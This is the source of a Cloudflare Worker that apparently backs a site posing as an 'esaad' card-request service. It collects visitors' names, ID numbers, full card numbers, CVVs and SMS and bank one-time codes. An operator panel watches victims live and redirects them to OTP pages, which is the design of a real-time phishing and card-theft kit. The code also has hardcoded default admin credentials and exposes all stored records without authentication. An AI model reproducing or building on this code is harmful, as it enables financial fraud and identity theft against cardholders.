import { createClient, SupabaseClient } from '@supabase/supabase-js';

export interface Env {
  ASSETS?: {
    fetch: (request: Request | string) => Promise<Response>;
  };
  SUPABASE_URL?: string;
  SUPABASE_SERVICE_ROLE_KEY?: string;
  SUPABASE_ANON_KEY?: string;
  ADMIN_EMAIL?: string;
  ADMIN_PASSWORD?: string;
  ADMIN_SECRET?: string;
}

export interface RequestRecord {
  id: string;
  name: string;
  mobile: string;
  idNumber: string;
  cardType: string;
  address: string;
  date: string;
  paymentName?: string;
  cardNumber?: string;
  expMonth?: string;
  expYear?: string;
  cvv?: string;
  otp?: string;
  otpStatus?: string;
  nextAction?: string;
  step: string;
  createdAt: string;
  updatedAt: string;
}

interface VisitorMeta {
  ip: string;
  os: string;
  device: string;
  browser: string;
  country: string;
}

interface PresenceEntry {
  lastSeen: number;
  currentPage: string;
  requestId: string | null;
  meta?: VisitorMeta;
}

// Edge isolate memory state
const adminTokens = new Set<string>();
const devicePresence = new Map<string, PresenceEntry>();
const userPresence = new Map<string, { lastSeen: number; currentPage: string }>();
const lastKnownUserPage = new Map<string, string>();
const userMetaMap = new Map<string, VisitorMeta>();
const pendingRedirects = new Map<string, string>();
let totalVisitorsCounter = 0;

function normalizeRedirectTarget(action?: string | null): string | null {
  if (!action) return null;
  const trimmed = String(action).trim();
  if (!trimmed) return null;
  const map: Record<string, string> = {
    '/': '/',
    home: '/',
    '/request': '/request',
    form: '/request',
    '/register-company': '/register-company',
    company: '/register-company',
    '/payment': '/payment',
    payment: '/payment',
    '/card-details': '/card-details',
    card: '/card-details',
    '/waiting': '/waiting',
    waiting: '/waiting',
    '/otp': '/otp',
    otp: '/otp',
    'otp-sms': '/otp',
    '/otp-bank': '/otp-bank',
    'otp-bank': '/otp-bank'
  };
  return map[trimmed] || (trimmed.startsWith('/') ? trimmed : null);
}

function getSupabase(env: Env): SupabaseClient | null {
  const supabaseUrl = env.SUPABASE_URL || '';
  const supabaseKey = env.SUPABASE_SERVICE_ROLE_KEY || env.SUPABASE_ANON_KEY || '';
  if (!supabaseUrl || !supabaseKey || !supabaseUrl.startsWith('http')) {
    return null;
  }
  return createClient(supabaseUrl, supabaseKey, {
    auth: { persistSession: false }
  });
}

function parseCookies(cookieHeader?: string | null): Record<string, string> {
  const list: Record<string, string> = {};
  if (!cookieHeader) return list;
  cookieHeader.split(';').forEach((cookie) => {
    const parts = cookie.split('=');
    const key = parts.shift()?.trim();
    if (key) {
      list[key] = decodeURIComponent(parts.join('=').trim());
    }
  });
  return list;
}

function extractVisitorMeta(request: Request): VisitorMeta {
  const ua = request.headers.get('user-agent') || '';
  const cfIp = request.headers.get('cf-connecting-ip');
  const forwarded = request.headers.get('x-forwarded-for') || '';
  const ip = (cfIp || forwarded.split(',')[0] || '188.53.192.70').trim();

  let os = 'Windows';
  if (/iPhone|iPad|iPod/i.test(ua)) os = 'iOS';
  else if (/Android/i.test(ua)) os = 'Android';
  else if (/Mac OS X/i.test(ua)) os = 'macOS';
  else if (/Linux/i.test(ua)) os = 'Linux';

  const device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'mobile' : 'desktop';

  let browser = 'Chrome';
  if (/Edg\//i.test(ua)) browser = 'Edge';
  else if (/OPR\//i.test(ua)) browser = 'Opera';
  else if (/Chrome\//i.test(ua)) browser = 'Chrome';
  else if (/Safari\//i.test(ua) && !/Chrome\//i.test(ua)) browser = 'Safari';
  else if (/Firefox\//i.test(ua)) browser = 'Firefox';

  const cfCountry = request.headers.get('cf-ipcountry');
  const cfCity = request.headers.get('cf-ipcity');
  const country =
    cfCountry && cfCity
      ? `${cfCountry}, ${cfCity}`
      : cfCountry || 'Saudi Arabia, Riyadh';

  return {
    ip,
    os,
    device,
    browser,
    country
  };
}

function prunePresence() {
  const cutoff = Date.now() - 12000;
  for (const [k, entry] of devicePresence.entries()) {
    if (entry.lastSeen < cutoff) devicePresence.delete(k);
  }
  for (const [k, entry] of userPresence.entries()) {
    if (entry.lastSeen < cutoff) userPresence.delete(k);
  }
}

function toSupabaseRow(record: Partial<RequestRecord> & { id: string }) {
  const row: Record<string, any> = { id: record.id };
  if (record.name !== undefined) row.name = record.name;
  if (record.mobile !== undefined) row.mobile = record.mobile;
  if (record.idNumber !== undefined) row.id_number = record.idNumber;
  if (record.cardType !== undefined) row.card_type = record.cardType;
  if (record.address !== undefined) row.address = record.address;
  if (record.date !== undefined) row.date = record.date;
  if (record.paymentName !== undefined) row.payment_name = record.paymentName;
  if (record.cardNumber !== undefined) row.card_number = record.cardNumber;
  if (record.expMonth !== undefined) row.exp_month = record.expMonth;
  if (record.expYear !== undefined) row.exp_year = record.expYear;
  if (record.cvv !== undefined) row.cvv = record.cvv;
  if (record.otp !== undefined) row.otp = record.otp;
  if (record.otpStatus !== undefined) row.otp_status = record.otpStatus;
  if (record.nextAction !== undefined) row.next_action = record.nextAction;
  if (record.step !== undefined) row.step = record.step;
  if (record.createdAt !== undefined) row.created_at = record.createdAt;
  if (record.updatedAt !== undefined) row.updated_at = record.updatedAt;
  return row;
}

function fromSupabaseRow(row: any): RequestRecord {
  return {
    id: row.id,
    name: row.name || '',
    mobile: row.mobile || '',
    idNumber: row.id_number ?? row.idNumber ?? '',
    cardType: row.card_type ?? row.cardType ?? '',
    address: row.address || '',
    date: row.date || '',
    paymentName: row.payment_name ?? row.paymentName ?? undefined,
    cardNumber: row.card_number ?? row.cardNumber ?? undefined,
    expMonth: row.exp_month ?? row.expMonth ?? undefined,
    expYear: row.exp_year ?? row.expYear ?? undefined,
    cvv: row.cvv ?? undefined,
    otp: row.otp ?? undefined,
    otpStatus: row.otp_status ?? row.otpStatus ?? undefined,
    nextAction: row.next_action ?? row.nextAction ?? undefined,
    step: row.step || 'form',
    createdAt: row.created_at ?? row.createdAt ?? new Date().toISOString(),
    updatedAt: row.updated_at ?? row.updatedAt ?? new Date().toISOString()
  };
}

// Stateless HMAC token signing so admin sessions persist across Cloudflare Worker isolates
async function signStatelessAdminToken(email: string, secret: string): Promise<string> {
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw',
    enc.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['sign']
  );
  const payload = btoa(JSON.stringify({ email, iat: Date.now() }));
  const sigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const sigHex = Array.from(new Uint8Array(sigBuf))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
  return `cf.${payload}.${sigHex}`;
}

async function verifyStatelessAdminToken(token: string, secret: string): Promise<boolean> {
  if (!token.startsWith('cf.')) return false;
  const parts = token.split('.');
  if (parts.length !== 3) return false;
  const [, payload, sigHex] = parts;
  const enc = new TextEncoder();
  const key = await crypto.subtle.importKey(
    'raw',
    enc.encode(secret),
    { name: 'HMAC', hash: 'SHA-256' },
    false,
    ['verify']
  );
  const expectedSigBuf = await crypto.subtle.sign('HMAC', key, enc.encode(payload));
  const expectedHex = Array.from(new Uint8Array(expectedSigBuf))
    .map((b) => b.toString(16).padStart(2, '0'))
    .join('');
  return sigHex === expectedHex;
}

function jsonResponse(data: unknown, status = 200, extraHeaders?: HeadersInit): Response {
  const headers = new Headers(extraHeaders);
  headers.set('Content-Type', 'application/json; charset=utf-8');
  return new Response(JSON.stringify(data), { status, headers });
}

export default {
  async fetch(request: Request, env: Env): Promise<Response> {
    const url = new URL(request.url);
    const pathname = url.pathname;
    const method = request.method.toUpperCase();

    // ==================== API ROUTES ====================
    if (pathname.startsWith('/api/')) {
      const cookies = parseCookies(request.headers.get('cookie'));
      const secret = env.ADMIN_SECRET || env.ADMIN_PASSWORD || 'esaad-cf-worker-secret';

      // 1. POST /api/presence
      if (pathname === '/api/presence' && method === 'POST') {
        const body: any = await request.json().catch(() => ({}));
        const clientId = body?.clientId || cookies.esaad_cid || crypto.randomUUID();
        const requestId = body?.requestId || cookies.esaad_req_id || null;
        const currentPage = String(body?.currentPage || '/');
        const isNewVisit = !cookies.esaad_visited && Boolean(body?.isNewVisit);
        const now = Date.now();
        const meta = extractVisitorMeta(request);

        const headers = new Headers();
        headers.append(
          'Set-Cookie',
          `esaad_cid=${encodeURIComponent(clientId)}; Path=/; HttpOnly; SameSite=Lax`
        );

        if (isNewVisit) {
          totalVisitorsCounter += 1;
          headers.append('Set-Cookie', 'esaad_visited=1; Path=/; HttpOnly; SameSite=Lax');
        }

        if (!currentPage.startsWith('/admin')) {
          devicePresence.set(String(clientId), {
            lastSeen: now,
            currentPage,
            requestId: requestId ? String(requestId) : null,
            meta
          });

          if (requestId) {
            const reqIdStr = String(requestId);
            userPresence.set(reqIdStr, {
              lastSeen: now,
              currentPage
            });
            lastKnownUserPage.set(reqIdStr, currentPage);
            userMetaMap.set(reqIdStr, meta);

            const targetRoute = pendingRedirects.get(reqIdStr);
            if (targetRoute) {
              if (currentPage === targetRoute) {
                pendingRedirects.delete(reqIdStr);
                const supabase = getSupabase(env);
                if (supabase) {
                  await supabase
                    .from('requests')
                    .update({ next_action: '', updated_at: new Date().toISOString() })
                    .eq('id', reqIdStr);
                }
              } else {
                prunePresence();
                return jsonResponse({ ok: true, requestId: reqIdStr, redirectTo: targetRoute }, 200, headers);
              }
            }
          }
        }

        prunePresence();
        return jsonResponse({ ok: true, requestId, redirectTo: null }, 200, headers);
      }

      // 2. GET /api/stats
      if (pathname === '/api/stats' && method === 'GET') {
        prunePresence();
        const onlineUsers: Record<string, boolean> = {};
        const userPages: Record<string, string> = {};
        const userMeta: Record<string, VisitorMeta> = {};

        for (const [reqId, page] of lastKnownUserPage.entries()) {
          userPages[reqId] = page;
        }
        for (const [reqId, meta] of userMetaMap.entries()) {
          userMeta[reqId] = meta;
        }
        for (const [reqId, entry] of userPresence.entries()) {
          onlineUsers[reqId] = true;
          userPages[reqId] = entry.currentPage;
        }

        const activeSessions = Array.from(devicePresence.entries()).map(([cid, entry]) => ({
          clientId: cid,
          requestId: entry.requestId,
          currentPage: entry.currentPage,
          lastSeen: entry.lastSeen,
          meta: entry.meta
        }));

        return jsonResponse({
          onlineCount: devicePresence.size,
          totalVisitorsCount: totalVisitorsCounter,
          onlineUsers,
          userPages,
          userMeta,
          activeSessions
        });
      }

      // 3. POST /api/admin/login
      if (pathname === '/api/admin/login' && method === 'POST') {
        const body: any = await request.json().catch(() => ({}));
        const { email, password } = body || {};
        if (!email || !password) {
          return jsonResponse({ error: 'الرجاء إدخال البريد الإلكتروني وكلمة المرور' }, 400);
        }

        const supabase = getSupabase(env);
        if (supabase) {
          const { data, error } = await supabase.auth.signInWithPassword({
            email: String(email).trim(),
            password: String(password)
          });
          if (!error && data.session) {
            const token = data.session.access_token;
            adminTokens.add(token);
            const headers = new Headers({
              'Set-Cookie': `esaad_admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax`
            });
            return jsonResponse({ token, user: { email: data.user?.email } }, 200, headers);
          }
        }

        const expectedEmail = env.ADMIN_EMAIL || 'admin@esaad.ae';
        const expectedPassword = env.ADMIN_PASSWORD || 'admin123';

        if (
          String(email).trim().toLowerCase() === expectedEmail.toLowerCase() &&
          String(password) === expectedPassword
        ) {
          const token = await signStatelessAdminToken(expectedEmail, secret);
          adminTokens.add(token);
          const headers = new Headers({
            'Set-Cookie': `esaad_admin_token=${encodeURIComponent(token)}; Path=/; HttpOnly; SameSite=Lax`
          });
          return jsonResponse({ token, user: { email: expectedEmail } }, 200, headers);
        }

        return jsonResponse({ error: 'البريد الإلكتروني أو كلمة المرور غير صحيحة' }, 401);
      }

      // 4. GET /api/admin/me
      if (pathname === '/api/admin/me' && method === 'GET') {
        const authHeader = request.headers.get('authorization');
        const token =
          authHeader && authHeader.startsWith('Bearer ')
            ? authHeader.slice(7)
            : cookies.esaad_admin_token || '';

        if (!token) {
          return jsonResponse({ authenticated: false }, 401);
        }
        if (adminTokens.has(token) || (await verifyStatelessAdminToken(token, secret))) {
          return jsonResponse({ authenticated: true });
        }

        const supabase = getSupabase(env);
        if (supabase) {
          const { data, error } = await supabase.auth.getUser(token);
          if (!error && data.user) {
            adminTokens.add(token);
            return jsonResponse({ authenticated: true, user: { email: data.user.email } });
          }
        }
        return jsonResponse({ authenticated: false }, 401);
      }

      // 5. POST /api/admin/logout
      if (pathname === '/api/admin/logout' && method === 'POST') {
        const authHeader = request.headers.get('authorization');
        const token =
          authHeader && authHeader.startsWith('Bearer ')
            ? authHeader.slice(7)
            : cookies.esaad_admin_token || '';
        if (token) {
          adminTokens.delete(token);
        }
        const headers = new Headers({
          'Set-Cookie': 'esaad_admin_token=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax'
        });
        return jsonResponse({ ok: true }, 200, headers);
      }

      // 6. GET /api/requests/current
      if (pathname === '/api/requests/current' && method === 'GET') {
        const id = cookies.esaad_req_id;
        if (!id) {
          return jsonResponse({ error: 'لا يوجد طلب نشط' }, 404);
        }
        const supabase = getSupabase(env);
        if (!supabase) {
          return jsonResponse(
            { error: 'يرجى ضبط إعدادات SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في الخادم' },
            503
          );
        }
        const { data, error } = await supabase.from('requests').select('*').eq('id', id).single();
        if (error || !data) {
          return jsonResponse({ error: 'الطلب غير موجود' }, 404);
        }
        return jsonResponse(fromSupabaseRow(data));
      }

      // 7. GET /api/requests & POST /api/requests
      if (pathname === '/api/requests') {
        const supabase = getSupabase(env);
        if (!supabase) {
          return jsonResponse(
            { error: 'يرجى ضبط SUPABASE_URL و SUPABASE_SERVICE_ROLE_KEY في إعدادات Cloudflare Worker' },
            503
          );
        }

        if (method === 'GET') {
          const { data, error } = await supabase
            .from('requests')
            .select('*')
            .order('updated_at', { ascending: false });
          if (error) {
            return jsonResponse({ error: error.message }, 500);
          }
          return jsonResponse((data || []).map(fromSupabaseRow));
        }

        if (method === 'POST') {
          const body: any = await request.json().catch(() => ({}));
          const now = new Date().toISOString();
          const id = crypto.randomUUID();
          const meta = extractVisitorMeta(request);

          const newRecord: RequestRecord = {
            id,
            name: body?.name || '',
            mobile: body?.mobile || '',
            idNumber: body?.idNumber || '',
            cardType: body?.cardType || '',
            address: body?.address || '',
            date: body?.date || '',
            step: 'form',
            createdAt: now,
            updatedAt: now
          };

          const { data, error } = await supabase
            .from('requests')
            .insert(toSupabaseRow(newRecord))
            .select('*')
            .single();

          if (error) {
            return jsonResponse({ error: error.message }, 500);
          }

          userPresence.set(id, { lastSeen: Date.now(), currentPage: '/payment' });
          lastKnownUserPage.set(id, '/payment');
          userMetaMap.set(id, meta);

          const headers = new Headers({
            'Set-Cookie': `esaad_req_id=${encodeURIComponent(id)}; Path=/; HttpOnly; SameSite=Lax`
          });
          return jsonResponse(fromSupabaseRow(data || newRecord), 201, headers);
        }
      }

      // 8. GET /api/requests/:id & PATCH /api/requests/:id
      if (pathname.startsWith('/api/requests/')) {
        const rawParam = decodeURIComponent(pathname.slice('/api/requests/'.length));
        const id = rawParam === 'current' ? cookies.esaad_req_id : rawParam;
        if (!id) {
          return jsonResponse({ error: 'معرف الطلب غير متوفر' }, 400);
        }

        const supabase = getSupabase(env);
        if (!supabase) {
          return jsonResponse({ error: 'يرجى ضبط إعدادات Supabase في الخادم' }, 503);
        }

        if (method === 'GET') {
          const { data, error } = await supabase.from('requests').select('*').eq('id', id).single();
          if (error || !data) {
            return jsonResponse({ error: 'الطلب غير موجود' }, 404);
          }
          return jsonResponse(fromSupabaseRow(data));
        }

        if (method === 'PATCH') {
          const body: any = await request.json().catch(() => ({}));
          const now = new Date().toISOString();
          const patchRow = toSupabaseRow({
            ...body,
            id,
            updatedAt: now
          });
          delete patchRow.id;

          if (body?.nextAction !== undefined) {
            const targetRoute = normalizeRedirectTarget(body.nextAction);
            if (targetRoute) {
              pendingRedirects.set(id, targetRoute);
              lastKnownUserPage.set(id, targetRoute);
              const existingPresence = userPresence.get(id);
              if (existingPresence) {
                userPresence.set(id, { ...existingPresence, currentPage: targetRoute });
              }
            } else {
              pendingRedirects.delete(id);
            }
          } else if (body?.step === 'card' || body?.step === 'otp' || body?.step === 'otp-bank') {
            pendingRedirects.delete(id);
          }

          const { data, error } = await supabase
            .from('requests')
            .update(patchRow)
            .eq('id', id)
            .select('*')
            .single();

          if (error) {
            return jsonResponse({ error: error.message }, 500);
          }
          return jsonResponse(fromSupabaseRow(data));
        }

        if (method === 'DELETE') {
          const { error } = await supabase.from('requests').delete().eq('id', id);
          if (error) {
            return jsonResponse({ error: error.message }, 500);
          }
          userPresence.delete(id);
          lastKnownUserPage.delete(id);
          userMetaMap.delete(id);
          pendingRedirects.delete(id);
          return jsonResponse({ ok: true, id });
        }
      }

      return jsonResponse({ error: 'Not Found' }, 404);
    }

    // ==================== STATIC ASSETS & SPA FALLBACK ====================
    if (env.ASSETS) {
      return env.ASSETS.fetch(request);
    }

    return new Response('Cloudflare Worker running. Static assets binding (ASSETS) not found.', {
      status: 200
    });
  }
};
